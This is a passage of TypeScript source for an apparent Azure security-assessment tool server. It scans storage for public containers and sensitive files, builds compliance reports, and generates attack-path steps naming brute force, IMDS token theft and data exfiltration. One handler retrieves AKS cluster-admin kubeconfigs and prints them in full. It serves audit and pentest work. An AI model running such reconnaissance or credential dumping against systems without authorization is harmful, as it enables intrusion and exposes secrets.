            if (account.allowBlobPublicAccess !== false) {
              accountsToScan.push(account);
            }
          }
        }

        // Scan each storage account
        for (const account of accountsToScan) {
          const accountName = account.name || "";
          const accountRg = account.id?.split('/')[4] || resourceGroup || "";
          let riskScore = 0;
          const accountFindings: any[] = [];
          const containers: any[] = [];
          let totalSensitiveFiles = 0;

          try {
            // Get storage account keys
            const keys = await storageClient.storageAccounts.listKeys(accountRg, accountName);
            const accountKey = keys.keys?.[0]?.value;

            if (!accountKey) {
              accountFindings.push({
                severity: "INFO",
                finding: "Cannot list keys - using managed identity authentication",
              });
              continue;
            }

            // Create BlobServiceClient
            const blobServiceClient = new BlobServiceClient(
              `https://${accountName}.blob.core.windows.net`,
              credential
            );

            // List all containers
            const containerIterator = blobServiceClient.listContainers();
            
            for await (const containerItem of containerIterator) {
              const containerName = containerItem.name;
              const containerClient = blobServiceClient.getContainerClient(containerName);
              const containerFindings: any[] = [];
              const sensitiveBlobs: any[] = [];
              let blobCount = 0;

              // Check container public access level
              const accessLevel = containerItem.properties?.publicAccess || "None";
              if (accessLevel !== "None") {
                containerFindings.push({
                  severity: "CRITICAL",
                  finding: `Container has public access: ${accessLevel}`,
                  description: "Blobs in this container can be accessed anonymously",
                  remediation: "Set public access level to 'None' (Private)",
                  cve: "CWE-284: Improper Access Control",
                  url: `https://${accountName}.blob.core.windows.net/${containerName}`,
                });
                riskScore += 50;
              }

              // List blobs in container
              try {
                const blobIterator = containerClient.listBlobsFlat({ includeMetadata: true });
                
                for await (const blob of blobIterator) {
                  blobCount++;
                  if (blobCount > maxBlobs) {
                    containerFindings.push({
                      severity: "INFO",
                      finding: `Stopped after ${maxBlobs} blobs (maxBlobsPerContainer limit)`,
                    });
                    break;
                  }

                  const blobName = blob.name;
                  const blobUrl = `https://${accountName}.blob.core.windows.net/${containerName}/${blobName}`;

                  // Check for sensitive file patterns
                  for (const { pattern, category, severity } of sensitivePatterns) {
                    if (pattern.test(blobName)) {
                      sensitiveBlobs.push({
                        name: blobName,
                        category,
                        severity,
                        size: blob.properties.contentLength,
                        lastModified: blob.properties.lastModified,
                        url: blobUrl,
                        publicAccess: accessLevel !== "None",
                      });
                      totalSensitiveFiles++;

                      if (accessLevel !== "None") {
                        containerFindings.push({
                          severity,
                          finding: `${severity} sensitive file exposed: ${blobName}`,
                          description: `${category} file is publicly accessible`,
                          remediation: "Move to private container or Key Vault",
                          cve: "CWE-200: Exposure of Sensitive Information",
                          url: blobUrl,
                        });
                        riskScore += severity === "CRITICAL" ? 40 : severity === "HIGH" ? 25 : 10;
                      }
                      break;
                    }
                  }

                  // Check blob metadata for SAS tokens
                  if (blob.metadata) {
                    const metadataStr = JSON.stringify(blob.metadata).toLowerCase();
                    if (metadataStr.includes('sig=') || metadataStr.includes('sastoken')) {
                      containerFindings.push({
                        severity: "HIGH",
                        finding: `SAS token detected in blob metadata: ${blobName}`,
                        description: "Blob metadata contains potential SAS token",
                        remediation: "Remove SAS tokens from blob metadata",
                        cve: "CWE-798: Use of Hard-coded Credentials",
                      });
                      riskScore += 30;
                    }
                  }
                }
              } catch (blobError: any) {
                containerFindings.push({
                  severity: "WARNING",
                  finding: `Could not list blobs: ${blobError.message}`,
                });
              }

              containers.push({
                name: containerName,
                publicAccessLevel: accessLevel,
                blobCount,
                sensitiveFilesFound: sensitiveBlobs.length,
                sensitiveBlobs,
                findings: containerFindings,
              });
            }

            accountFindings.push(...containers.flatMap(c => c.findings));

          } catch (error: any) {
            accountFindings.push({
              severity: "ERROR",
              finding: `Failed to scan storage account: ${error.message}`,
              description: "Ensure you have Storage Blob Data Reader role or account key access",
            });
          }

          scanResults.push({
            storageAccountName: accountName,
            resourceGroup: accountRg,
            location: account.location,
            allowBlobPublicAccess: account.allowBlobPublicAccess,
            totalContainers: containers.length,
            publicContainers: containers.filter(c => c.publicAccessLevel !== "None").length,
            totalSensitiveFiles,
            riskScore,
            riskLevel: riskScore >= 50 ? "CRITICAL" : riskScore >= 30 ? "HIGH" : riskScore >= 15 ? "MEDIUM" : "LOW",
            containers,
            findings: accountFindings,
          });
        }

        // Sort by risk score
        scanResults.sort((a, b) => b.riskScore - a.riskScore);

        const summary = {
          totalAccountsScanned: scanResults.length,
          criticalRisk: scanResults.filter(s => s.riskLevel === "CRITICAL").length,
          highRisk: scanResults.filter(s => s.riskLevel === "HIGH").length,
          totalSensitiveFiles: scanResults.reduce((sum, s) => sum + s.totalSensitiveFiles, 0),
          publicContainers: scanResults.reduce((sum, s) => sum + s.publicContainers, 0),
        };

        return {
          content: [
            {
              type: "text",
              text: `# Storage Container & Blob Deep Scan\n\n## Summary\n- Storage Accounts Scanned: ${summary.totalAccountsScanned}\n- CRITICAL Risk: ${summary.criticalRisk}\n- HIGH Risk: ${summary.highRisk}\n- Total Sensitive Files Found: ${summary.totalSensitiveFiles}\n- Public Containers: ${summary.publicContainers}\n\n## Detailed Findings\n\n${JSON.stringify(scanResults, null, 2)}`,
            },
          ],
        };
      }

      case "generate_security_report": {
        const { subscriptionId, resourceGroup, format, includeRemediation, includeCompliance } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
          format?: string;
          includeRemediation?: boolean;
          includeCompliance?: boolean;
        };

        const outputFormat = format || "markdown";
        const withRemediation = includeRemediation !== false;
        const withCompliance = includeCompliance !== false;

        // Run all security scanners to gather findings
        const findings: any = {
          subscription: subscriptionId,
          resourceGroup: resourceGroup || "All",
          scanDate: new Date().toISOString(),
          summary: {
            critical: 0,
            high: 0,
            medium: 0,
            low: 0,
            totalFindings: 0,
          },
          categories: {} as any,
        };

        try {
          // Storage security scan
          const storageClient = new StorageManagementClient(credential, subscriptionId);
          const storageAccounts = resourceGroup
            ? storageClient.storageAccounts.listByResourceGroup(resourceGroup)
            : storageClient.storageAccounts.list();

          const storageFindings: any[] = [];
          for await (const account of storageAccounts) {
            const accountFindings: any[] = [];
            if (account.allowBlobPublicAccess === true) {
              accountFindings.push({ severity: "HIGH", resource: account.name, finding: "Public blob access enabled" });
            }
            if (account.enableHttpsTrafficOnly === false) {
              accountFindings.push({ severity: "CRITICAL", resource: account.name, finding: "HTTPS-only disabled" });
            }
            if (account.minimumTlsVersion !== "TLS1_2") {
              accountFindings.push({ severity: "HIGH", resource: account.name, finding: "Weak TLS version" });
            }
            storageFindings.push(...accountFindings);
          }
          findings.categories.storage = { count: storageFindings.length, findings: storageFindings };

          // NSG security scan
          const networkClient = new NetworkManagementClient(credential, subscriptionId);
          const nsgs = resourceGroup
            ? networkClient.networkSecurityGroups.list(resourceGroup)
            : networkClient.networkSecurityGroups.listAll();

          const nsgFindings: any[] = [];
          const dangerousPorts = [22, 3389, 1433, 3306, 5432, 27017, 5985, 5986];
          for await (const nsg of nsgs) {
            for (const rule of nsg.securityRules || []) {
              if (rule.access === "Allow" && rule.direction === "Inbound") {
                const sourceWildcard = ["*", "0.0.0.0/0", "Internet", "Any"].some(s =>
                  rule.sourceAddressPrefix?.includes(s) || rule.sourceAddressPrefixes?.some(p => p.includes(s))
                );
                const port = rule.destinationPortRange;
                if (sourceWildcard && port && dangerousPorts.some(p => port.includes(String(p)))) {
                  nsgFindings.push({ severity: "CRITICAL", resource: nsg.name, finding: `Port ${port} exposed to Internet` });
                }
              }
            }
          }
          findings.categories.network = { count: nsgFindings.length, findings: nsgFindings };

          // SQL security scan
          const sqlClient = new SqlManagementClient(credential, subscriptionId);
          const sqlServers = sqlClient.servers.list();
          const sqlFindings: any[] = [];
          for await (const server of sqlServers) {
            const serverRg = server.id?.split('/')[4] || "";
            const firewallRules = await sqlClient.firewallRules.listByServer(serverRg, server.name || "");
            for await (const rule of firewallRules) {
              if (rule.startIpAddress === "0.0.0.0" && rule.endIpAddress === "255.255.255.255") {
                sqlFindings.push({ severity: "CRITICAL", resource: server.name, finding: "SQL firewall allows all IPs" });
              }
            }
          }
          findings.categories.sql = { count: sqlFindings.length, findings: sqlFindings };

          // Key Vault security scan
          const kvClient = new KeyVaultManagementClient(credential, subscriptionId);
          const vaults = resourceGroup
            ? kvClient.vaults.listByResourceGroup(resourceGroup)
            : kvClient.vaults.listBySubscription();
          const kvFindings: any[] = [];
          for await (const vault of vaults) {
            if (!vault.properties?.enableSoftDelete) {
              kvFindings.push({ severity: "CRITICAL", resource: vault.name, finding: "Soft delete disabled" });
            }
            if (!vault.properties?.enablePurgeProtection) {
              kvFindings.push({ severity: "HIGH", resource: vault.name, finding: "Purge protection disabled" });
            }
          }
          findings.categories.keyvault = { count: kvFindings.length, findings: kvFindings };

        } catch (error: any) {
          findings.error = `Failed to gather all findings: ${error.message}`;
        }

        // Calculate summary
        for (const category of Object.values(findings.categories)) {
          const cat = category as any;
          for (const finding of cat.findings || []) {
            findings.summary.totalFindings++;
            if (finding.severity === "CRITICAL") findings.summary.critical++;
            else if (finding.severity === "HIGH") findings.summary.high++;
            else if (finding.severity === "MEDIUM") findings.summary.medium++;
            else findings.summary.low++;
          }
        }

        // Generate report based on format
        if (outputFormat === "json") {
          return {
            content: [{ type: "text", text: JSON.stringify(findings, null, 2) }],
          };
        }

        // Markdown format
        let report = `# Azure Security Assessment Report\n\n`;
        report += `**Subscription:** ${subscriptionId}\n`;
        report += `**Resource Group:** ${findings.resourceGroup}\n`;
        report += `**Scan Date:** ${findings.scanDate}\n\n`;
        report += `## Executive Summary\n\n`;
        report += `**Total Findings:** ${findings.summary.totalFindings}\n`;
        report += `- [CRITICAL] **CRITICAL:** ${findings.summary.critical}\n`;
        report += `- [HIGH] **HIGH:** ${findings.summary.high}\n`;
        report += `- [MEDIUM] **MEDIUM:** ${findings.summary.medium}\n`;
        report += `- [LOW] **LOW:** ${findings.summary.low}\n\n`;

        report += `## Risk Assessment\n\n`;
        const overallRisk = findings.summary.critical > 0 ? "CRITICAL" : findings.summary.high > 0 ? "HIGH" : "MEDIUM";
        report += `**Overall Risk Level:** ${overallRisk}\n\n`;

        report += `## Findings by Category\n\n`;
        for (const [category, data] of Object.entries(findings.categories)) {
          const cat = data as any;
          report += `### ${category.toUpperCase()} (${cat.count} findings)\n\n`;
          for (const finding of cat.findings || []) {
            report += `- **${finding.severity}**: ${finding.resource} - ${finding.finding}\n`;
          }
          report += `\n`;
        }

        if (withRemediation) {
          report += `## Remediation Priorities\n\n`;
          report += `### Immediate Actions (CRITICAL)\n`;
          report += `1. Disable HTTP-only on storage accounts (enable HTTPS)\n`;
          report += `2. Remove SQL firewall allow-all rules (0.0.0.0-255.255.255.255)\n`;
          report += `3. Enable Key Vault soft delete\n`;
          report += `4. Close management ports exposed to Internet (SSH/RDP)\n\n`;

          report += `### Short-term (HIGH - within 7 days)\n`;
          report += `1. Disable public blob access on storage accounts\n`;
          report += `2. Upgrade TLS to version 1.2+\n`;
          report += `3. Enable Key Vault purge protection\n`;
          report += `4. Restrict NSG rules to specific IPs\n\n`;
        }

        if (withCompliance) {
          report += `## Compliance Framework Mapping\n\n`;
          report += `### CIS Azure Foundations Benchmark\n`;
          report += `- **3.1** [CHECK] Ensure secure transfer (HTTPS) is enabled - ${findings.categories.storage?.findings.filter((f: any) => f.finding.includes("HTTPS")).length || 0} violations\n`;
          report += `- **3.2** [CHECK] Ensure storage account access keys are periodically regenerated\n`;
          report += `- **3.3** [CHECK] Ensure public network access is disabled for storage accounts - ${findings.categories.storage?.findings.filter((f: any) => f.finding.includes("Public")).length || 0} violations\n`;
          report += `- **6.1** [CHECK] Ensure SQL server firewall rules do not allow 0.0.0.0-255.255.255.255 - ${findings.categories.sql?.findings.filter((f: any) => f.finding.includes("firewall")).length || 0} violations\n\n`;

          report += `### NIST Cybersecurity Framework\n`;
          report += `- **PR.AC-3**: Implement remote access management\n`;
          report += `- **PR.DS-1**: Data-at-rest is protected (encryption)\n`;
          report += `- **PR.DS-2**: Data-in-transit is protected (HTTPS/TLS)\n`;
          report += `- **PR.PT-4**: Communications and control networks are protected\n\n`;
        }

        report += `---\n\n`;
        report += `*Generated by Stratos v1.8.0*\n`;
        report += `*HackTricks Methodology: https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/*\n`;

        // Handle different export formats
        const { outputFile } = request.params.arguments as { outputFile?: string };

        // CSV Export
        if (outputFormat === "csv") {
          const csvData: any[] = [];
          for (const [category, data] of Object.entries(findings.categories)) {
            const cat = data as any;
            for (const finding of cat.findings || []) {
              csvData.push({
                Category: category.toUpperCase(),
                Severity: finding.severity,
                Resource: finding.resource,
                Finding: finding.finding,
                Subscription: subscriptionId,
                ScanDate: findings.scanDate,
              });
            }
          }

          if (outputFile) {
            try {
              const csvWriter = createObjectCsvWriter({
                path: outputFile,
                header: [
                  { id: 'Severity', title: 'Severity' },
                  { id: 'Category', title: 'Category' },
                  { id: 'Resource', title: 'Resource' },
                  { id: 'Finding', title: 'Finding' },
                  { id: 'Subscription', title: 'Subscription' },
                  { id: 'ScanDate', title: 'Scan Date' },
                ],
              });
              await csvWriter.writeRecords(csvData);
              return {
                content: [{ type: "text", text: `[OK] CSV report saved to: ${outputFile}\n\nTotal findings exported: ${csvData.length}` }],
              };
            } catch (error: any) {
              return {
                content: [{ type: "text", text: `[FAIL] Failed to save CSV: ${error.message}\n\nCSV Data:\n${JSON.stringify(csvData, null, 2)}` }],
              };
            }
          } else {
            // Return CSV as text
            const csvText = 'Severity,Category,Resource,Finding,Subscription,ScanDate\n' +
              csvData.map(row => `${row.Severity},${row.Category},"${row.Resource}","${row.Finding}",${row.Subscription},${row.ScanDate}`).join('\n');
            return {
              content: [{ type: "text", text: csvText }],
            };
          }
        }

        // HTML Export
        if (outputFormat === "html") {
          const htmlReport = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Azure Security Assessment Report</title>
  <style>
    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 40px; background: #f5f5f5; }
    .container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
    h1 { color: #0078d4; border-bottom: 3px solid #0078d4; padding-bottom: 10px; }
    h2 { color: #333; margin-top: 30px; }
    .summary { background: #e7f3ff; padding: 20px; border-radius: 5px; margin: 20px 0; }
    .critical { color: #d13438; font-weight: bold; }
    .high { color: #ff8c00; font-weight: bold; }
    .medium { color: #f4c430; font-weight: bold; }
    .low { color: #107c10; font-weight: bold; }
    table { width: 100%; border-collapse: collapse; margin: 20px 0; }
    th { background: #0078d4; color: white; padding: 12px; text-align: left; }
    td { padding: 10px; border-bottom: 1px solid #ddd; }
    tr:hover { background: #f9f9f9; }
    .metadata { color: #666; font-size: 0.9em; }
  </style>
</head>
<body>
  <div class="container">
    <h1>Azure Security Assessment Report</h1>
    <div class="metadata">
      <p><strong>Subscription:</strong> ${subscriptionId}</p>
      <p><strong>Resource Group:</strong> ${findings.resourceGroup}</p>
      <p><strong>Scan Date:</strong> ${findings.scanDate}</p>
    </div>
    
    <div class="summary">
      <h2>Executive Summary</h2>
      <p><strong>Total Findings:</strong> ${findings.summary.totalFindings}</p>
      <p class="critical">[CRITICAL] CRITICAL: ${findings.summary.critical}</p>
      <p class="high">[HIGH] HIGH: ${findings.summary.high}</p>
      <p class="medium">[MEDIUM] MEDIUM: ${findings.summary.medium}</p>
      <p class="low">[LOW] LOW: ${findings.summary.low}</p>
    </div>

    <h2>Findings by Category</h2>
    ${Object.entries(findings.categories).map(([category, data]) => {
      const cat = data as any;
      return `
        <h3>${category.toUpperCase()} (${cat.count} findings)</h3>
        <table>
          <tr><th>Severity</th><th>Resource</th><th>Finding</th></tr>
          ${cat.findings.map((f: any) => `
            <tr>
              <td class="${f.severity.toLowerCase()}">${f.severity}</td>
              <td>${f.resource}</td>
              <td>${f.finding}</td>
            </tr>
          `).join('')}
        </table>
      `;
    }).join('')}

    <hr>
    <p class="metadata">Generated by Stratos v1.8.0</p>
  </div>
</body>
</html>`;

          if (outputFile) {
            try {
              fs.writeFileSync(outputFile, htmlReport, 'utf-8');
              return {
                content: [{ type: "text", text: `[OK] HTML report saved to: ${outputFile}\n\nOpen in browser to view the interactive dashboard.` }],
              };
            } catch (error: any) {
              return {
                content: [{ type: "text", text: `[FAIL] Failed to save HTML: ${error.message}` }],
              };
            }
          } else {
            return {
              content: [{ type: "text", text: htmlReport }],
            };
          }
        }

        // PDF Export
        if (outputFormat === "pdf") {
          if (!outputFile) {
            return {
              content: [{ type: "text", text: `[FAIL] PDF export requires outputFile parameter.\n\nExample: outputFile="C:\\\\reports\\\\security-report.pdf"` }],
              isError: true,
            };
          }

          try {
            const doc = new PDFDocument({ margin: 50 });
            const stream = fs.createWriteStream(outputFile);
            doc.pipe(stream);

            // Title
            doc.fontSize(24).fillColor('#0078d4').text('Azure Security Assessment Report', { align: 'center' });
            doc.moveDown();

            // Metadata
            doc.fontSize(10).fillColor('#666')
              .text(`Subscription: ${subscriptionId}`, { continued: true })
              .text(`  |  Resource Group: ${findings.resourceGroup}`, { continued: true })
              .text(`  |  Date: ${new Date(findings.scanDate).toLocaleDateString()}`);
            doc.moveDown(2);

            // Executive Summary
            doc.fontSize(16).fillColor('#000').text('Executive Summary');
            doc.moveDown(0.5);
            doc.fontSize(12)
              .text(`Total Findings: ${findings.summary.totalFindings}`)
              .fillColor('#d13438').text(`[CRITICAL] CRITICAL: ${findings.summary.critical}`)
              .fillColor('#ff8c00').text(`[HIGH] HIGH: ${findings.summary.high}`)
              .fillColor('#f4c430').text(`[MEDIUM] MEDIUM: ${findings.summary.medium}`)
              .fillColor('#107c10').text(`[LOW] LOW: ${findings.summary.low}`);
            doc.moveDown(2);

            // Findings
            doc.fontSize(16).fillColor('#000').text('Findings by Category');
            doc.moveDown();

            for (const [category, data] of Object.entries(findings.categories)) {
              const cat = data as any;
              doc.fontSize(14).text(`${category.toUpperCase()} (${cat.count} findings)`);
              doc.moveDown(0.5);

              for (const finding of cat.findings || []) {
                const color = finding.severity === 'CRITICAL' ? '#d13438' :
                              finding.severity === 'HIGH' ? '#ff8c00' :
                              finding.severity === 'MEDIUM' ? '#f4c430' : '#107c10';
                doc.fontSize(10)
                  .fillColor(color).text(`[${finding.severity}] `, { continued: true })
                  .fillColor('#000').text(`${finding.resource}: ${finding.finding}`);
              }
              doc.moveDown();
            }

            // Footer
            doc.fontSize(8).fillColor('#666')
              .text('Generated by Stratos v1.8.0', { align: 'center' });

            doc.end();

            await new Promise<void>((resolve) => stream.on('finish', () => resolve()));

            return {
              content: [{ type: "text", text: `[OK] PDF report saved to: ${outputFile}\n\nTotal findings: ${findings.summary.totalFindings}\n[CRITICAL] Critical: ${findings.summary.critical}\n[HIGH] High: ${findings.summary.high}` }],
            };
          } catch (error: any) {
            return {
              content: [{ type: "text", text: `[FAIL] Failed to generate PDF: ${error.message}` }],
              isError: true,
            };
          }
        }

        // Default: Markdown or JSON
        return {
          content: [{ type: "text", text: report }],
        };
      }

      case "analyze_attack_paths": {
        const { subscriptionId, resourceGroup, startFrom } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
          startFrom?: string;
        };

        const startPoint = startFrom || "all";
        const attackPaths: any[] = [];

        try {
          const networkClient = new NetworkManagementClient(credential, subscriptionId);
          const storageClient = new StorageManagementClient(credential, subscriptionId);
          const computeClient = new ComputeManagementClient(credential, subscriptionId);
          const authClient = new AuthorizationManagementClient(credential, subscriptionId);
          const resourceClient = new ResourceManagementClient(credential, subscriptionId);

          // Attack Path 1: Public IP → NSG → VM → Managed Identity → Resources
          if (startPoint === "all" || startPoint === "public-ips") {
            const publicIPs = resourceGroup
              ? networkClient.publicIPAddresses.list(resourceGroup)
              : networkClient.publicIPAddresses.listAll();

            for await (const pip of publicIPs) {
              const attachedTo = pip.ipConfiguration?.id?.split('/').slice(-3, -2)[0];
              if (attachedTo === "networkInterfaces") {
                const nicId = pip.ipConfiguration?.id;
                const vmName = nicId?.split('/').slice(-3)[0];

                attackPaths.push({
                  severity: "HIGH",
                  path: "Public IP → VM → Managed Identity",
                  steps: [
                    `1. Target public IP: ${pip.ipAddress} (${pip.dnsSettings?.fqdn || "no DNS"})`,
                    `2. Attached to VM: ${vmName}`,
                    `3. Check NSG rules for exposed ports (SSH/RDP)`,
                    `4. Compromise VM via exposed service`,
                    `5. Use VM's managed identity to access Azure resources`,
                    `6. Potential targets: Key Vault, Storage, Databases`,
                  ],
                  entryPoint: `Public IP ${pip.ipAddress}`,
                  target: "VM managed identity escalation",
                  risk: "If VM has managed identity with privileged roles, attacker can pivot to other resources",
                });
              }
            }
          }

          // Attack Path 2: Public Storage → Sensitive Data
          if (startPoint === "all" || startPoint === "storage") {
            const storageAccounts = resourceGroup
              ? storageClient.storageAccounts.listByResourceGroup(resourceGroup)
              : storageClient.storageAccounts.list();

            for await (const account of storageAccounts) {
              if (account.allowBlobPublicAccess === true) {
                attackPaths.push({
                  severity: "CRITICAL",
                  path: "Public Storage → Data Exfiltration",
                  steps: [
                    `1. Target storage account: ${account.name}`,
                    `2. Public blob access is ENABLED`,
                    `3. Enumerate containers anonymously`,
                    `4. List blobs without authentication`,
                    `5. Download sensitive files (backups, configs, databases)`,
                    `6. Extract credentials from downloaded files`,
                    `7. Use credentials to access other Azure resources`,
                  ],
                  entryPoint: `Storage account ${account.name}`,
                  target: "Sensitive data exfiltration → credential theft",
                  risk: "Anonymous access to storage can expose backups, configs with connection strings, API keys",
                });
              }
            }
          }

          // Attack Path 3: NSG Misconfiguration → VM Compromise → Lateral Movement
          if (startPoint === "all" || startPoint === "vms") {
            const nsgs = resourceGroup
              ? networkClient.networkSecurityGroups.list(resourceGroup)
              : networkClient.networkSecurityGroups.listAll();

            for await (const nsg of nsgs) {
              for (const rule of nsg.securityRules || []) {
                if (rule.access === "Allow" && rule.direction === "Inbound") {
                  const wildcardSource = ["*", "0.0.0.0/0", "Internet", "Any"].some(s =>
                    rule.sourceAddressPrefix?.includes(s)
                  );
                  const port = rule.destinationPortRange;
                  if (wildcardSource && (port?.includes("22") || port?.includes("3389"))) {
                    attackPaths.push({
                      severity: "CRITICAL",
                      path: "NSG Wildcard → RDP/SSH Brute Force → Lateral Movement",
                      steps: [
                        `1. Identify exposed port ${port} on NSG: ${nsg.name}`,
                        `2. NSG rule allows source: ${rule.sourceAddressPrefix} (Internet)`,
                        `3. Brute force / password spray attack on ${port === "22" ? "SSH" : "RDP"}`,
                        `4. Gain initial foothold on VM`,
                        `5. Enumerate VM's managed identity and RBAC roles`,
                        `6. Use Azure Instance Metadata Service (IMDS) to get access token`,
                        `7. Pivot to other resources based on VM's permissions`,
                      ],
                      entryPoint: `NSG ${nsg.name} - Port ${port}`,
                      target: "VM compromise → managed identity abuse → lateral movement",
                      risk: "Management port exposed to Internet enables brute force → full VM access → identity escalation",
                    });
                  }
                }
              }
            }
          }

          // Attack Path 4: Over-Privileged Identity → Privilege Escalation
          if (startPoint === "all" || startPoint === "identities") {
            const scope = resourceGroup
              ? `/subscriptions/${subscriptionId}/resourceGroups/${resourceGroup}`
              : `/subscriptions/${subscriptionId}`;

            const roleAssignments = authClient.roleAssignments.listForScope(scope);
            const privilegedRoles = ["Owner", "Contributor", "User Access Administrator"];

            for await (const assignment of roleAssignments) {
              const roleDefId = assignment.roleDefinitionId?.split('/').pop();
              // Check if service principal with privileged role
              if (assignment.principalType === "ServicePrincipal") {
                attackPaths.push({
                  severity: "HIGH",
                  path: "Service Principal Compromise → Privilege Escalation",
                  steps: [
                    `1. Target service principal with privileged role`,
                    `2. Service principal has broad permissions across subscription`,
                    `3. If SP credentials are compromised (leaked in code, CI/CD)`,
                    `4. Attacker can assume SP identity`,
                    `5. Execute privileged operations based on RBAC role`,
                    `6. Create backdoors, exfiltrate data, modify resources`,
                  ],
                  entryPoint: `Service Principal (${assignment.principalId})`,
                  target: "Subscription-level privilege escalation",
                  risk: "Compromised service principal credentials = full subscription access if Owner/Contributor role",
                });
              }
            }
          }

          // Attack Path 5: SQL Public Endpoint → Database Access
          const sqlClient = new SqlManagementClient(credential, subscriptionId);
          const sqlServers = sqlClient.servers.list();
          for await (const server of sqlServers) {
            if (server.publicNetworkAccess === "Enabled") {
              const serverRg = server.id?.split('/')[4] || "";
              const firewallRules = await sqlClient.firewallRules.listByServer(serverRg, server.name || "");
              for await (const rule of firewallRules) {
                if (rule.startIpAddress === "0.0.0.0" && rule.endIpAddress === "255.255.255.255") {
                  attackPaths.push({
                    severity: "CRITICAL",
                    path: "Public SQL Endpoint → Direct Database Access",
                    steps: [
                      `1. SQL Server: ${server.name} has public network access`,
                      `2. Firewall rule allows all IPs: 0.0.0.0-255.255.255.255`,
                      `3. Attempt SQL authentication brute force`,
                      `4. Use leaked credentials from previous breaches`,
                      `5. Direct database access without VPN`,
                      `6. Exfiltrate all database contents`,
                      `7. Extract user credentials, PII, business data`,
                    ],
                    entryPoint: `SQL Server ${server.name}`,
                    target: "Direct database compromise and data exfiltration",
                    risk: "Public SQL endpoint + allow-all firewall = unrestricted database access attempts",
                  });
                }
              }
            }
          }

        } catch (error: any) {
          attackPaths.push({
            severity: "ERROR",
            path: "Analysis Error",
            steps: [`Failed to analyze attack paths: ${error.message}`],
          });
        }

        // Sort by severity
        const severityOrder: any = { CRITICAL: 0, HIGH: 1, MEDIUM: 2, LOW: 3, ERROR: 4 };
        attackPaths.sort((a, b) => severityOrder[a.severity] - severityOrder[b.severity]);

        const summary = {
          totalPaths: attackPaths.length,
          critical: attackPaths.filter(p => p.severity === "CRITICAL").length,
          high: attackPaths.filter(p => p.severity === "HIGH").length,
          analysisScope: startPoint,
        };

        let report = `# Attack Path Analysis\n\n`;
        report += `**Subscription:** ${subscriptionId}\n`;
        report += `**Resource Group:** ${resourceGroup || "All"}\n`;
        report += `**Analysis Scope:** ${startPoint}\n`;
        report += `**Date:** ${new Date().toISOString()}\n\n`;
        report += `## Summary\n\n`;
        report += `- **Total Attack Paths:** ${summary.totalPaths}\n`;
        report += `- **CRITICAL Severity:** ${summary.critical}\n`;
        report += `- **HIGH Severity:** ${summary.high}\n\n`;

        report += `## Attack Paths (Exploitation Scenarios)\n\n`;
        for (let i = 0; i < attackPaths.length; i++) {
          const path = attackPaths[i];
          report += `### ${i + 1}. ${path.path} [${path.severity}]\n\n`;
          report += `**Entry Point:** ${path.entryPoint}\n`;
          report += `**Target:** ${path.target}\n`;
          report += `**Risk:** ${path.risk}\n\n`;
          report += `**Attack Steps:**\n`;
          for (const step of path.steps) {
            report += `${step}\n`;
          }
          report += `\n---\n\n`;
        }

        report += `## Mitigation Recommendations\n\n`;
        report += `1. **Remove public access** - Disable public blob access, use private endpoints\n`;
        report += `2. **Restrict NSG rules** - Whitelist specific IPs, remove 0.0.0.0/0 rules\n`;
        report += `3. **Implement JIT access** - Use Just-in-Time VM access for management ports\n`;
        report += `4. **Least privilege** - Review RBAC assignments, remove excessive permissions\n`;
        report += `5. **Enable MFA** - Enforce multi-factor authentication for all accounts\n`;
        report += `6. **Private endpoints** - Use private links for PaaS services (SQL, Storage)\n`;
        report += `7. **Network isolation** - Segment networks, use VNets and subnets\n\n`;

        report += `*Generated by Stratos v1.8.0*\n`;

        return {
          content: [{ type: "text", text: report }],
        };
      }

      case "get_aks_credentials": {
        const { subscriptionId, resourceGroup, clusterName, adminAccess } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup: string;
          clusterName: string;
          adminAccess?: boolean;
        };

        const containerClient = new ContainerServiceClient(credential, subscriptionId);
        
        try {
          // Get cluster details
          const cluster = await containerClient.managedClusters.get(resourceGroup, clusterName);
          
          // Get credentials
          let credentialsResult;
          let credentialType;
          
          if (adminAccess) {
            try {
              credentialsResult = await containerClient.managedClusters.listClusterAdminCredentials(
                resourceGroup,
                clusterName
              );
              credentialType = "Admin Credentials (cluster-admin RBAC)";
            } catch (error: any) {
              return {
                content: [{
                  type: "text",
                  text: `[FAIL] **FAILED to retrieve admin credentials**\n\nError: ${error.message}\n\nThis usually means you lack the required Azure RBAC permission:\n- **Required Role:** Azure Kubernetes Service Cluster Admin\n\nTry with user credentials instead (set adminAccess=false).`
                }],
                isError: true,
              };
            }
          } else {
            credentialsResult = await containerClient.managedClusters.listClusterUserCredentials(
              resourceGroup,
              clusterName
            );
            credentialType = "User Credentials (Azure AD RBAC)";
          }

          // Extract kubeconfig
          const kubeconfigBase64 = credentialsResult.kubeconfigs?.[0]?.value;
          const kubeconfigContent = kubeconfigBase64
            ? Buffer.from(kubeconfigBase64).toString('utf-8')
            : "N/A";

          // Parse cluster info
          const fqdn = cluster.fqdn || "N/A";
          const apiServerUrl = `https://${fqdn}:443`;
          
          let report = `# AKS Cluster Credentials - ${clusterName}\n\n`;
          report += `## Summary\n`;
          report += `- **Credential Type:** ${credentialType}\n`;
          report += `- **Cluster FQDN:** ${fqdn}\n`;
          report += `- **API Server:** ${apiServerUrl}\n`;
          report += `- **Kubernetes Version:** ${cluster.kubernetesVersion}\n`;
          report += `- **Location:** ${cluster.location}\n`;
          report += `- **Private Cluster:** ${cluster.apiServerAccessProfile?.enablePrivateCluster ? "[OK] Yes" : "[FAIL] No (PUBLIC)"}\n\n`;
          
          report += `## Identity Configuration\n`;
          if (cluster.identity?.type === "SystemAssigned") {
            report += `- **Cluster Identity:** System-Assigned Managed Identity\n`;
            report += `- **Principal ID:** ${cluster.identity.principalId}\n`;
          } else if (cluster.identity?.type === "UserAssigned") {
            report += `- **Cluster Identity:** User-Assigned Managed Identity\n`;
            const identityIds = Object.keys(cluster.identity.userAssignedIdentities || {});
            report += `- **Identity Resources:** ${identityIds.join(", ")}\n`;
          }
          
          if (cluster.servicePrincipalProfile?.clientId) {
            report += `- **Service Principal:** ${cluster.servicePrincipalProfile.clientId}\n`;
          }
          
          report += `\n## Kubeconfig\n\`\`\`yaml\n${kubeconfigContent}\n\`\`\`\n\n`;
          
